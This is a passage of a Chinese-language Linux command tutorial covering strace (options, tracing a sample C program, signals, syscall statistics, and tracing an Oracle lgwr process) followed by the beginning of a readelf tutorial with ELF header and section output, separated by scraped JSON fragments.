输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. -V 输出strace的版本信息. -x 以十六进制形式输出非标准字符串 -xx 所有字符串以十六进制形式输出. -a column 设置返回值的输出位置.默认 为40. -e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier=][!]value1[,value2]... qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\\\. -e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all. -e trace=file 只跟踪有关文件操作的系统调用. -e trace=process 只跟踪有关进程控制的系统调用. -e trace=network 跟踪与网络有关的所有系统调用. -e strace=signal 跟踪所有与系统信号有关的 系统调用 -e trace=ipc 跟踪所有与进程通讯有关的系统调用 -e abbrev=set 设定strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all. -e raw=set 将指定的系统调用的参数以十六进制显示. -e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号. -e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5 -e write=set 输出写入到指定文件中的数据. -o filename 将strace的输出写入文件filename -p pid 跟踪指定的进程pid. -s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出. -u username 以username的UID和GID执行被跟踪的命令 实例 追踪系统调用 现在我们做一个很简单的程序来演示 strace 的基本用法。这个程序的 C 语言代码如下： # filename test.c #include &lt;stdio.h&gt; int main() { int a; scanf(&quot;%d&quot;, &amp;a); printf(&quot;%09d\\n&quot;, a); return 0; } 然后我们用gcc -o test test.c编译一下，得到一个可执行的文件 test。然后用 strace 调用执行： strace ./test 执行期间会要求你输入一个整数，我们输入 99，最后得到如下的结果： // 直接执行test的结果 oracle@orainst[orcl]:~ $./test // 执行的结果 99 000000099 // 通过strace执行test的结果 oracle@orainst[orcl]:~ $strace ./test // strace的trace结果 execve(&quot;./test&quot;, [&quot;./test&quot;], [/* 41 vars */]) = 0 uname({sys=&quot;Linux&quot;, node=&quot;orainst.desktop.mycompany.com&quot;, ...}) = 0 brk(0) = 0x8078000 fstat64(3, {st_mode=S_IFREG|0644, st_size=65900, ...}) = 0 old_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) = 0xbf5ef000 close(3) = 0 open(&quot;/lib/tls/libc.so.6&quot;, O_RDONLY) = 3 read(3, &quot;\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1&quot;..., 512) = 512 fstat64(3, {st_mode=S_IFREG|0755, st_size=1571692, ...}) = 0 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ee000 old_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0xa02000 old_mmap(0xb34000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x132000) = 0xb34000 old_mmap(0xb37000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb37000 close(3) = 0 set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 munmap(0xbf5ef000, 65900) = 0 fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ff000 read(0, 99 &quot;99\\n&quot;, 1024) = 3 fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5fe000 write(1, &quot;000000099\\n&quot;, 10000000099 ) = 10 munmap(0xbf5fe000, 4096) = 0 exit_group(0) = ? 从 trace 结构可以看到，系统首先调用 execve 开始一个新的进行，接着进行些环境的初始化操作，最后停顿在”read(0,”上面，这也就是执行到了我们的 scanf 函数，等待我们输入数字呢，在输入完 99 之后，在调用 write 函数将格式化后的数值”000000099″输出到屏幕，最后调用 exit_group 退出进行，完成整个程序的执行过程。 跟踪信号传递 我们还是使用上面的那个 test 程序，来观察进程接收信号的情况。还是先strace ./test，等到等待输入的画面的时候不要输入任何东西，然后打开另外一个窗口，输入如下的命令 killall test 这时候就能看到我们的程序推出了，最后的 trace 结果如下： oracle@orainst[orcl]:~ $strace ./test execve(&quot;./test&quot;, [&quot;./test&quot;], [/* 41 vars */]) = 0 uname({sys=&quot;Linux&quot;, node=&quot;orainst.desktop.mycompany.com&quot;, ...}) = 0 brk(0) = 0x9ae2000 old_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) = 0xbf5ef000 close(3) = 0 open(&quot;/lib/tls/libc.so.6&quot;, O_RDONLY) = 3 read(3, &quot;\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1&quot;..., 512) = 512 fstat64(3, {st_mode=S_IFREG|0755, st_size=1571692, ...}) = 0 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ee000 old_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x2e9000 old_mmap(0x41b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x132000) = 0x41b000 old_mmap(0x41e000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x41e000 close(3) = 0 set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 munmap(0xbf5ef000, 65900) = 0 fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5ff000 read(0, 0xbf5ff000, 1024) = ? ERESTARTSYS (To be restarted) --- SIGTERM (Terminated) @ 0 (0) --- +++ killed by SIGTERM +++ trace 中很清楚的告诉你 test 进程”+++ killed by SIGTERM +++”。 系统调用统计 strace 不光能追踪系统调用，通过使用参数-c，它还能将进程所有的系统调用做一个统计分析给你，下面就来看看 strace 的统计，这次我们执行带-c 参数的 strace： strace -c ./test 最后能得到这样的 trace 结果： oracle@orainst[orcl]:~$strace -c ./test execve(&quot;./test&quot;, [&quot;./test&quot;], [/* 41 vars */]) = 0 % time seconds usecs/call calls errors syscall ------ ----------- ----------- --------- --------- ---------------- 45.90 0.000140 5 27 25 open 34.43 0.000105 4 24 21 stat64 7.54 0.000023 5 5 old_mmap 2.62 0.000008 8 1 munmap 1.97 0.000006 6 1 uname 1.97 0.000006 2 3 fstat64 1.64 0.000005 3 2 1 read 1.31 0.000004 2 2 close 0.98 0.000003 3 1 brk 0.98 0.000003 3 1 mmap2 0.66 0.000002 2 1 set_thread_area ------ ----------- ----------- --------- --------- ---------------- 100.00 0.000305 68 47 total 这里很清楚的告诉你调用了那些系统函数，调用次数多少，消耗了多少时间等等这些信息，这个对我们分析一个程序来说是非常有用的。 常用参数说明 除了-c 参数之外，strace 还提供了其他有用的参数给我们，让我们能很方便的得到自己想要的信息，下面就对那些常用的参数一一做个介绍。 重定向输出 参数-o 用在将 strace 的结果输出到文件中，如果不指定-o 参数的话，默认的输出设备是 STDERR，也就是说使用”-o filename”和” 2&gt;filename”的结果是一样的。 # 这两个命令都是将strace结果输出到文件test.txt中 strace -c -o test.txt ./test strace -c ./test 2&gt;test.txt 对系统调用进行计时 strace 可以使用参数-T 将每个系统调用所花费的时间打印出来，每个调用的时间花销现在在调用行最右边的尖括号里面。 oracle@orainst[orcl]:~ $strace -T ./test // 这里只摘录部分结果 read(0, 1 &quot;1\\n&quot;, 1024) = 2 &lt;2.673455&gt; fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 &lt;0.000014&gt; mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xbf5fe000 &lt;0.000017&gt; write(1, &quot;000000001\\n&quot;, 10000000001 ) = 10 &lt;0.000016&gt; munmap(0xbf5fe000, 4096) = 0 &lt;0.000020&gt; exit_group(0) = ? 系统调用的时间 这是一个很有用的功能，strace 会将每次系统调用的发生时间记录下来，只要使用-t/tt/ttt 三个参数就可以看到效果了，具体的例子可以自己去尝试。 参数名 输出样式 说明 -t 10:33:04 exit_group(0) 输出结果精确到秒 -tt 10:33:48.159682 exit_group(0) 输出结果精确到微妙 -ttt 1262169244.788478 exit_group(0) 精确到微妙，而且时间表示为unix时间戳 截断输出 -s 参数用于指定 trace 结果的每一行输出的字符串的长度，下面看看 test 程序中-s 参数对结果有什么影响，现指定-s 为 20，然后在 read 的是是很我们输入一个超过 20 个字符的数字串 strace -s 20 ./test read(0, 2222222222222222222222222 // 我们输入的2一共有25个 &quot;22222222222222222222&quot;..., 1024) = 26 // 而我们看到的结果中2只有20个 trace 一个现有的进程 strace 不光能自己初始化一个进程进行 trace，还能追踪现有的进程，参数-p 就是取这个作用的，用法也很简单，具体如下。 strace -p pid 综合例子 说了那么多的功能和参数，现在我们来一个实用点的，就是研究下 Oracle 的 lgwr 进程，看看这个进程是不是像文档所说的那样没 3s 钟写一次 log 文件，考虑到 lgwr 写日志的触发条件比较多，我们需要找一个空闲的 Oracle 实例做这个实验。 我们先要得到 lgwr 进程的 pid，运行下面的命令 ps -ef|grep lgwr oracle 5912 1 0 Nov12 ? 00:14:56 ora_lgwr_orcl 得到 lgwr 的 pid 是 5912，现在启动 strace，然后将 trace 的几个输出到 lgwr.txt 文件中，执行下面的命令 strace -tt -s 10 -o lgwr.txt -p 5912 过一会之后停止 strace，然后查看结果。由于输出的结果比较多，为了方便我们只看 Oracle 写入 log 文件时用的 pwrite 函数的调用 grep pwrite\\(20 lgwr.txt 等等，为什么 grep 的时候用的是”pwrite(2″呢？，因为我知道我这个机器打开的当前的 log 文件的句柄编号都是 2 开始的。具体查找方法是先使用下面的语句找出当前活动的日志文件都有哪些： select member, v$log.status from v$log, v$logfile where v$log.group#=v$logfile.group#; 得到 MEMBER STATUS -------------------------------------------------- ---------------- /db/databases/orcl/redo-01-a/redo-t01-g03-m1.log INACTIVE /db/databases/orcl/redo-03-a/redo-t01-g03-m2.log INACTIVE /db/databases/orcl/redo-02-a/redo-t01-g02-m1.log CURRENT /db/databases/orcl/redo-04-a/redo-t01-g02-m2.log CURRENT /db/databases/orcl/redo-01-a/redo-t01-g01-m1.log INACTIVE /db/databases/orcl/redo-03-a/redo-t01-g01-m2.log INACTIVE /db/databases/orcl/redo-02-a/redo-t01-g04-m1.log INACTIVE /db/databases/orcl/redo-04-a/redo-t01-g04-m2.log INACTIVE 然后到/proc 中去找打开文件的句柄： ll /proc/.5912/fd/ 得到 lrwx------ 1 oracle dba 64 Dec 30 10:55 18 -&gt; /db/databases/orcl/redo-01-a/redo-t01-g01-m1.log lrwx------ 1 oracle dba 64 Dec 30 10:55 19 -&gt; /db/databases/orcl/redo-03-a/redo-t01-g01-m2.log lrwx------ 1 oracle dba 64 Dec 30 10:55 20 -&gt; /db/databases/orcl/redo-02-a/redo-t01-g02-m1.log lrwx------ 1 oracle dba 64 Dec 30 10:55 21 -&gt; /db/databases/orcl/redo-04-a/redo-t01-g02-m2.log lrwx------ 1 oracle dba 64 Dec 30 10:55 22 -&gt; /db/databases/orcl/redo-01-a/redo-t01-g03-m1.log lrwx------ 1 oracle dba 64 Dec 30 10:55 23 -&gt; /db/databases/orcl/redo-03-a/redo-t01-g03-m2.log lrwx------ 1 oracle dba 64 Dec 30 10:55 24 -&gt; /db/databases/orcl/redo-02-a/redo-t01-g04-m1.log lrwx------ 1 oracle dba 64 Dec 30 10:55 25 -&gt; /db/databases/orcl/redo-04-a/redo-t01-g04-m2.log 现在能看到我机器当前日志文件的句柄分别是 20 和 21。 现在我们得到如下结果 11:13:55.603245 pwrite(20, &quot;\\1\\&quot;\\0\\0J!&quot;..., 1536, 4363264) = 1536 11:13:55.603569 pwrite(21, &quot;\\1\\&quot;\\0\\0J!&quot;..., 1536, 4363264) = 1536 11:13:55.606888 pwrite(20, &quot;\\1\\&quot;\\0\\0M!&quot;..., 1536, 4364800) = 1536 11:13:55.607172 pwrite(21, &quot;\\1\\&quot;\\0\\0M!&quot;..., 1536, 4364800) = 1536 11:13:55.607934 pwrite(20, &quot;\\1\\&quot;\\0\\0P!&quot;..., 1536, 4366336) = 1536 11:13:55.608199 pwrite(21, &quot;\\1\\&quot;\\0\\0P!&quot;..., 1536, 4366336) = 1536 11:13:55.610260 pwrite(20, &quot;\\1\\&quot;\\0\\0S!&quot;..., 1536, 4367872) = 1536 11:13:55.610530 pwrite(21, &quot;\\1\\&quot;\\0\\0S!&quot;..., 1536, 4367872) = 1536 11:14:00.602446 pwrite(20, &quot;\\1\\&quot;\\0\\0V!&quot;..., 1536, 4369408) = 1536 11:14:00.602750 pwrite(21, &quot;\\1\\&quot;\\0\\0V!&quot;..., 1536, 4369408) = 1536 11:14:00.606386 pwrite(20, &quot;\\1\\&quot;\\0\\0Y!&quot;..., 1536, 4370944) = 1536 11:14:00.606676 pwrite(21, &quot;\\1\\&quot;\\0\\0Y!&quot;..., 1536, 4370944) = 1536 11:14:00.607900 pwrite(20, &quot;\\1\\&quot;\\0\\0\\\\&quot;..., 1024, 4372480) = 1024 11:14:00.608161 pwrite(21, &quot;\\1\\&quot;\\0\\0\\\\&quot;..., 1024, 4372480) = 1024 11:14:00.608816 pwrite(20, &quot;\\1\\&quot;\\0\\0^!&quot;..., 1024, 4373504) = 1024 11:14:00.609071 pwrite(21, &quot;\\1\\&quot;\\0\\0^!&quot;..., 1024, 4373504) = 1024 11:14:00.611142 pwrite(20, &quot;\\1\\&quot;\\0\\0`!&quot;..., 1536, 4374528) = 1536 11:14:00.611454 pwrite(21, &quot;\\1\\&quot;\\0\\0`!&quot;..., 1536, 4374528) = 1536 11:14:05.602804 pwrite(20, &quot;\\1\\&quot;\\0\\0c!&quot;..., 1024, 4376064) = 1024 11:14:05.603119 pwrite(21, &quot;\\1\\&quot;\\0\\0c!&quot;..., 1024, 4376064) = 1024 11:14:05.607731 pwrite(20, &quot;\\1\\&quot;\\0\\0e!&quot;..., 1024, 4377088) = 1024 11:14:05.608020 pwrite(21, &quot;\\1\\&quot;\\0\\0e!&quot;..., 1024, 4377088) = 1024 11:14:05.608690 pwrite(20, &quot;\\1\\&quot;\\0\\0g!&quot;..., 1024, 4378112) = 1024 11:14:05.608962 pwrite(21, &quot;\\1\\&quot;\\0\\0g!&quot;..., 1024, 4378112) = 1024 11:14:05.611022 pwrite(20, &quot;\\1\\&quot;\\0\\0i!&quot;..., 1536, 4379136) = 1536 11:14:05.611283 pwrite(21, &quot;\\1\\&quot;\\0\\0i!&quot;..., 1536, 4379136) = 1536 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"strace","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/strace/","stats":{"text":"17 min read","time":1018000,"words":3651,"minutes":17},"date":"2022-02-01 15:36:07","dateFormat":"2022-02-01"},{"content":"用于显示 elf 格式文件的信息。 补充说明 readelf 命令用来显示一个或者多个 elf 格式的目标文件的信息，可以通过它的选项来控制显示哪些信息。这里的 elf-file(s) 就表示那些被检查的文件。可以支持 32 位，64 位的 elf 格式文件，也支持包含 elf 文件的文档（这里一般指的是使用 ar 命令将一些 elf 文件打包之后生成的例如 lib*.a 之类的“静态库”文件）。 这个程序和 objdump 提供的功能类似，但是它显示的信息更为具体，并且它不依赖 BFD 库 (BFD 库是一个 GNU 项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件)，所以即使 BFD 库有什么 bug 存在的话也不会影响到 readelf 程序。 运行 readelf 的时候，除了-v 和-H 之外，其它的选项必须有一个被指定。 ELF 文件类型 种类型的 ELF 文件： 可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如 lib*.a 文件。 可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件 a.out。 共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成 elf 目标文件或者和执行文件一起创建进程映像，例如 lib*.so 文件。 ELF 文件作用： ELF 文件参与程序的连接 (建立一个程序) 和程序的执行 (运行一个程序)，所以可以从不同的角度来看待 elf 格式的文件： 如果用于编译和链接（可重定位文件），则编译器和链接器将把 elf 文件看作是节头表描述的节的集合,程序头表可选。 如果用于加载执行（可执行文件），则加载器则将把 elf 文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。 如果是共享文件，则两者都含有。 ELF 文件总体组成： elf 文件头描述 elf 文件的总体信息。包括：系统相关，类型相关，加载相关，链接相关。 系统相关表示：elf 文件标识的魔术数，以及硬件和平台等相关信息，增加了 elf 文件的移植性,使交叉编译成为可能。 类型相关就是前面说的那个类型。 加载相关：包括程序头表相关信息。 链接相关：节头表相关信息。 选项 -a --all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I. -h --file-header 显示elf文件开始的文件头信息. -l --program-headers --segments 显示程序头（段头）信息(如果有的话)。 -S --section-headers --sections 显示节头信息(如果有的话)。 -g --section-groups 显示节组信息(如果有的话)。 -t --section-details 显示节的详细信息(-S的)。 -s --syms --symbols 显示符号表段中的项（如果有的话）。 -e --headers 显示全部头信息，等价于: -h -l -S -n --notes 显示note段（内核注释）的信息。 -r --relocs 显示可重定位段的信息。 -u --unwind 显示unwind段信息。当前只支持IA64 ELF的unwind段信息。 -d --dynamic 显示动态段的信息。 -V --version-info 显示版本段的信息。 -A --arch-specific 显示CPU构架信息。 -D --use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 -x &lt;number or name&gt; --hex-dump=&lt;number or name&gt; 以16进制方式显示指定段内内容。number指定段表中段的索引,或字符串指定文件中的段名。 -w[liaprmfFsoR] or --debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] 显示调试段中指定的内容。 -I --histogram 显示符号的时候，显示bucket list长度的柱状图。 -v --version 显示readelf的版本信息。 -H --help 显示readelf所支持的命令行选项。 -W --wide 宽行输出。 @file 可以将选项集中到一个文件中，然后使用这个@file选项载入。 实例 先给出如下例子： 对于可执行文件形式的 elf 格式文件： (1) 查看可执行程序的源代码如下： root@localhost [test]$ cat main.cpp #include &lt;iostream&gt; using std::cout; using std::endl; void my_print(); int main(int argc, char *argv[]) { my_print(); cout&lt;&lt;&quot;hello!&quot;&lt;&lt;endl; return 0; } void my_print() { cout&lt;&lt;&quot;print!&quot;&lt;&lt;endl; } (2) 编译如下： [root@localhost test]$ g++ main.cpp -o main [root@localhost test]$ g++ -g main.cpp -o main.debug (3) 编译之后，查看生成的文件： [root@localhost test]$ ls -l 总计 64 -rwxr-xr-x 1 quietheart quietheart 6700 07-07 18:04 main -rw-r--r-- 1 quietheart quietheart 201 07-07 18:02 main.cpp -rwxr-xr-x 1 quietheart quietheart 38932 07-07 18:04 main.debug 这里，main.debug 是带有调试信息的可执行文件，main 是一般的可执行文件。 对于库文件形式的 elf 格式文件： (1) 查看库的源代码如下： //myfile.h#ifndef __MYFILE_H #define __MYFILE_H void printInfo();#endif //myfile.cpp#include &quot;myfile.h&quot; #include &amp;lt;iostream&amp;gt; using std::cout;using std::endl;void printInfo(){ cout&amp;lt;&amp;lt;&quot;hello&quot;&amp;lt;&amp;lt;endl;} (2) 编译如下： [root@localhost test]$ g++ -c myfile.cpp [root@localhost test]$ g++ -shared -fPCI -o libmy.so myfile.o [root@localhost test]$ ar -r libmy.a myfile.o ar: creating libmy.a (3) 编译之后，查看生成的文件： [root@localhost test]$ ls -l 总计 44 -rw-r--r-- 1 quietheart quietheart 2154 07-08 16:14 libmy.a -rwxr-xr-x 1 quietheart quietheart 5707 07-08 16:08 libmy.so -rwxr-xr-x 1 quietheart quietheart 117 07-08 16:06 myfile.cpp -rwxr-xr-x 1 quietheart quietheart 63 07-08 16:08 myfile.h -rw-r--r-- 1 quietheart quietheart 2004 07-08 16:08 myfile.o libmy.a libmy.so myfile.cpp myfile.h myfile.o 这里，分别生成目标文件 myfile.o，共享库文件 libmy.so，和静态库文件 libmy.a。 基于以上可执行文件和库，这里给出一些常用的命令。 读取可执行文件形式的 elf 文件头信息： [root@localhost test]$ readelf -h main ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 type: exec (Executable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x8048580 Start of program headers: 52 (bytes into file) Start of section headers: 3232 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 40 (bytes) Number of section headers: 29 Section header string table index: 26 这里，可见可执行文件的 elf 文件，其类型为 EXEC (可执行文件)。另外，含调试信息的&quot;main.debug&quot;和不含调试信息的&quot;main&quot;除了一些大小信息之外，其内容是一样的。并且由此可见文件的体系结构为 Intel 80386。 读取目标文件形式的 elf 文件头信息： [root@localhost test]$ readelf -h myfile.o ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: REL (Relocatable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x0 Start of program headers: 0 (bytes into file) Start of section headers: 516 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 40 (bytes) Number of section headers: 15 Section header string table index: 12 这里，可见目标文件的 elf 文件，其类型为 REL (可重定位文件)。 读取静态库文件形式的 elf 文件头信息： [root@localhost test]$ readelf -h libmy.a File: libmy.a(myfile.o) ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: REL (Relocatable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x0 Start of program headers: 0 (bytes into file) Start of section headers: 516 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 40 (bytes) Number of section headers: 15 Section header string table index: 12 这里，可见静态库文件的 elf 文件，其类型为 REL (可重定位文件)。 读取动态库文件形式的 elf 文件头信息： [root@localhost test]$ readelf -h libmy.so ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x550 Start of program headers: 52 (bytes into file) Start of section headers: 2768 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 5 Size of section headers: 40 (bytes) Number of section headers: 27 Section header string table index: 24 这里，可见动态库文件的 elf 文件，其类型为 DYN (共享目标文件)。 查看可执行的 elf 文件程序头表信息： [root@localhost test]$ readelf -l main Elf file type is EXEC (Executable file) Entry point 0x8048580 There are 8 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4 INTERP 0x000134 0x08048134 0x08048134 0x00013 0x00013 R 0x1 Requesting program interpreter: /lib/[ld-linux.so.2] LOAD 0x000000 0x08048000 0x08048000 0x00970 0x00970 R E 0x1000 LOAD 0x000970 0x08049970 0x08049970 0x00130 0x001c8 RW 0x1000 DYNAMIC 0x000988 0x08049988 0x08049988 0x000e0 0x000e0 RW 0x4 NOTE 0x000148 0x08048148 0x08048148 0x00020 0x00020 R 0x4 GNU_EH_FRAME 0x000820 0x08048820 0x08048820 0x00044 0x00044 R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 03 .ctors .dtors .jcr .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag 06 .eh_frame_hdr 07 这里，含调试信息的&quot;main.debug&quot;和不含调试信息的&quot;main&quot;其内容是一样的。 查看目标文件的 elf 文件程序头表信息： [root@localhost test]$ readelf -l myfile.o There are no program headers in this file. 这里可知，可重定位的目标文件，它没程序头表。 查看静态库文件的 elf 文件程序头表信息： [root@localhost test]$ readelf -l libmy.a File: libmy.a(myfile.o) There are no program headers in this file. 这里可知，可重定位的静态库文件，它没程序头表。 查看动态库文件的 elf 文件程序头表信息： [root@localhost test]$ readelf -l libmy.so Elf file type is DYN (Shared object file) Entry point 0x550 There are 5 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align LOAD 0x000000 0x00000000 0x00000000 0x007f4 0x007f4 R E 0x1000 LOAD 0x0007f4 0x000017f4 0x000017f4 0x0011c 0x00128 RW 0x1000 DYNAMIC 0x000810 0x00001810 0x00001810 0x000e0 0x000e0 RW 0x4 GNU_EH_FRAME 0x000738 0x00000738 0x00000738 0x0002c 0x0002c R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4 Section to Segment mapping: Segment Sections... 00 .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 01 .ctors .dtors .jcr .data.rel.ro .dynamic .got .got.plt .bss 02 .dynamic 03 .eh_frame_hdr 04 这里可知，做为共享目标文件的动态库，它程序头表。 查看一个可执行的 elf 文件的节信息： [root@localhost test]$ readelf -S main There are 29 section headers, starting at offset 0xca0: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048134 000134 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048148 000148 000020 00 A 0 0 4 [ 3] .gnu.hash GNU_HASH 08048168 000168 000030 04 A 4 0 4 [ 4] .dynsym DYNSYM 08048198 000198 0000d0 10 A 5 1 4 [ 5] .dynstr STRTAB 08048268 000268 000183 00 A 0 0 1 [ 6] .gnu.version VERSYM 080483ec 0003ec 00001a 02 A 4 0 2 [ 7] .gnu.version_r VERNEED 08048408 000408 000060 00 A 5 2 4 [ 8] .rel.dyn REL 08048468 000468 000010 08 A 4 0 4 [ 9] .rel.plt REL 08048478 000478 000048 08 A 4 11 4 [10] .init PROGBITS 080484c0 0004c0 000017 00 AX 0 0 4 [11] .plt PROGBITS 080484d8 0004d8 0000a0 04 AX 0 0 4 [12] .text PROGBITS 08048580 000580 000268 00 AX 0 0 16 [13] .fini PROGBITS 080487e8 0007e8 00001c 00 AX 0 0 4 [14] .rodata PROGBITS 08048804 000804 00001a 00 A 0 0 4 [15] .eh_frame_hdr PROGBITS 08048820 000820 000044 00 A 0 0 4 [16] .eh_frame PROGBITS 08048864 000864 00010c 00 A 0 0 4 [17] .ctors PROGBITS 08049970 000970 00000c 00 WA 0 0 4 [18] .dtors PROGBITS 0804997c 00097c 000008 00 WA 0 0 4 [19] .jcr PROGBITS 08049984 000984 000004 00 WA 0 0 4 [20] .dynamic DYNAMIC 08049988 000988 0000e0 08 WA 5 0 4 [21] .got PROGBITS 08049a68 000a68 000004 04 WA 0 0 4 [22] .got.plt PROGBITS 08049a6c 000a6c 000030 04 WA 0 0 4 [23] .data PROGBITS 08049a9c 000a9c 000004 00 WA 0 0 4 [24] .bss NOBITS 08049aa0 000aa0 000098 00 WA 0 0 8 [25] .comment PROGBITS 00000000 000aa0 000114 00 0 0 1 [26] .shstrtab STRTAB 00000000 000bb4 0000e9 00 0 0 1 [27] .symtab SYMTAB 00000000 001128 000510 10 28 53 4 [28] .strtab STRTAB 00000000 001638 0003f4 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 这里，main 是可执行文件，不含调试信息。 查看一个包含调试信息的可执行的 elf 文件的节信息： [root@localhost test]$ readelf -S main.debug There are 37 section headers, starting at offset 0x88c8: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048134 000134 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048148 000148 000020 00 A 0 0 4 [ 3] .gnu.hash GNU_HASH 08048168 000168 000030 04 A 4 0 4 [ 4] .dynsym DYNSYM 08048198 000198 0000d0 10 A 5 1 4 [ 5] .dynstr STRTAB 08048268 000268 000183 00 A 0 0 1 